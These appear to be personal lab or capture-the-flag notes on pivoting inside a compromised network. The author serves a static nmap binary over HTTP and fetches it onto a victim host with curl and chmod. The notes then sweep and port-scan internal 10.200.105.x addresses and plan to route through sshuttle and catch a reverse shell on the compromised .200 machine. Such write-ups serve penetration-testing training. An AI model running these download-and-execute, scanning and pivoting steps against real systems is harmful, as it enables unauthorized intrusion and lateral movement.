
Nmap Binary
https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/nmap

Will download the file and will send it to the victim
```
python3 -m http.server 80
```
![[Pasted image 20231225002841.png]]

```
curl 10.50.106.240/nmap-sardarji -o /tmp/nmap-sardarji && chmod +x /tmp/nmap-sardarji
```
![[Pasted image 20231225002923.png]]


```
./nmap-sardarji -sn 10.200.105.1-255 -oN scan-sardarji
```
![[Pasted image 20231225003439.png]]


```
./nmap-sardarji -sS -p 1-15000 10.200.105.150
```
![[Pasted image 20231225013419.png]]

We have already compromised .200

So we are able to connect to .150 directly but we can't get a shell from outside wall as firewall will block it.
.200 -> sshuttle -> 150 

So we will simply open up a listener on .200 and catch the reverse shell there.


